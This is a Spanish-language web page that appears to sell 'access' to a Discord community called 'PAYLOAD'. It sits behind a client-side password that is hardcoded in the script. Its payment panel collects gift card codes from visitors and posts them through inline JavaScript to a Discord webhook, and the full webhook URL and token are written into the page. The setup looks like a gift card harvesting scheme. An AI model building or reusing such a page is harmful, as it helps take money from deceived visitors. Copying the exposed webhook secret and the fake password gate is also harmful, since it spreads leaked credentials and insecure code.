<body>

<div id="login">
  <form class="card" id="form">
    <h1>ZYOX</h1>
    <p>Introduce la contraseña para entrar</p>
    <input type="password" id="pass" placeholder="Contraseña" autocomplete="off" autofocus>
    <button type="submit">Entrar</button>
    <div id="error"></div>
  </form>
</div>

<!-- Contenido protegido (vacío por ahora) -->
<main id="contenido">
  <a class="servidor" href="https://discord.gg/fnHcUzfWu" target="_blank" rel="noopener">
    <div class="icono" id="icono"></div>
    <div class="info">
      <div class="nombre" id="nombre">PAYLOAD</div>
      <div class="link">discord.gg/fnHcUzfWu</div>
      <div class="acceso">SI TE UNES OBTIENES EL ACCESO</div>
      <div class="miembros" id="miembros"></div>
    </div>
    <div class="unirse">UNIRSE A LA COMUNIDAD</div>
  </a>
  <button type="button" class="pagos" id="pagos">MÉTODOS DE PAGO</button>
  <ul class="lista-pagos" id="lista-pagos">
    <li>PAYPAL</li>
    <li id="gift-item">
      <div class="gift-titulo" id="gift-titulo">GIFT CARDS</div>
      <div class="gift-panel" id="gift-panel">
        <input type="text" id="gift-codigo" placeholder="INSERTA EL CÓDIGO DE LA GIFT CARD" autocomplete="off">
        <input type="text" id="gift-tipo" placeholder="DE QUE ES TU TARJETA" autocomplete="off">
        <button type="button" class="gift-enviar" id="gift-enviar">ENVIAR</button>
        <div id="gift-msg"></div>
      </div>
    </li>
  </ul>
</main>

<script>
  const PASSWORD = "ZYOX";

  function mostrarContenido() {
    document.getElementById("login").style.display = "none";
    document.getElementById("contenido").style.display = "block";
  }

  // Carga nombre, foto y miembros del servidor desde Discord
  const ENDPOINTS = [
    "https://discord.com/api/v10/invites/fnHcUzfWu?with_counts=true",
    "https://discord.com/api/v9/invites/fnHcUzfWu?with_counts=true",
    "https://discordapp.com/api/v9/invites/fnHcUzfWu?with_counts=true"
  ];

  function cargarInvitacion(i) {
    if (i >= ENDPOINTS.length) return Promise.reject();
    return fetch(ENDPOINTS[i])
      .then(r => { if (!r.ok) throw 0; return r.json(); })
      .catch(() => cargarInvitacion(i + 1));
  }

  cargarInvitacion(0)
    .then(d => {
      const g = d.guild || {};
      if (g.name) {
        document.getElementById("nombre").textContent = g.name;
      }
      if (d.approximate_member_count) {
        document.getElementById("miembros").textContent = d.approximate_member_count + " miembros";
      }
    })
    .catch(() => {});

  document.getElementById("pagos").addEventListener("click", function () {
    document.getElementById("lista-pagos").classList.toggle("abierta");
  });

  document.getElementById("gift-titulo").addEventListener("click", function () {
    document.getElementById("gift-panel").classList.toggle("abierto");
  });

  const WEBHOOK = "https://discord.com/api/webhooks/1557359520085311561/qvUsplN0FJNXm8Bw3C9VCIJ_A3m8idg5lNgqJ_nAE_WuY_rNdHD46kshqQ-gBJrPVgmX";

  document.getElementById("gift-enviar").addEventListener("click", function () {
    const btn = this;
    const msg = document.getElementById("gift-msg");
    const codigo = document.getElementById("gift-codigo").value.trim();
    const tipo = document.getElementById("gift-tipo").value.trim();

    if (!codigo || !tipo) {
      msg.className = "err";
      msg.textContent = "Llena los dos campos";
      return;
    }

    btn.disabled = true;
    msg.className = "";
    msg.textContent = "Enviando...";

    fetch(WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        allowed_mentions: { parse: [] },
        embeds: [{
          title: "Nueva gift card",
          color: 5793266,
          fields: [
            { name: "Código", value: "```" + codigo.slice(0, 500) + "```" },
            { name: "De qué es", value: tipo.slice(0, 500) }
          ],
          timestamp: new Date().toISOString()
        }]
      })
    })
    .then(function (r) {
      if (!r.ok) throw new Error();
      document.getElementById("gift-codigo").value = "";
      document.getElementById("gift-tipo").value = "";
      msg.className = "ok";
      msg.textContent = "Enviado";
    })
    .catch(function () {
      msg.className = "err";
      msg.textContent = "No se pudo enviar, intenta de nuevo";
    })
    .finally(function () { btn.disabled = false; });
  });

  // Bloquear zoom / cambio de tamaño
  ["gesturestart", "gesturechange", "gestureend"].forEach(function (ev) {
    document.addEventListener(ev, function (e) { e.preventDefault(); });
  });
  document.addEventListener("wheel", function (e) { if (e.ctrlKey) e.preventDefault(); }, { passive: false });
  document.addEventListener("keydown", function (e) {
    if ((e.ctrlKey || e.metaKey) && ["+", "-", "=", "0"].indexOf(e.key) !== -1) e.preventDefault();
  });

  document.getElementById("form").addEventListener("submit", function (e) {
    e.preventDefault();
    const valor = document.getElementById("pass").value;
    if (valor === PASSWORD) {
      mostrarContenido();
    } else {
      document.getElementById("error").textContent = "Contraseña incorrecta";
      document.getElementById("pass").value = "";
    }
  });
</script>
</body>
</html>
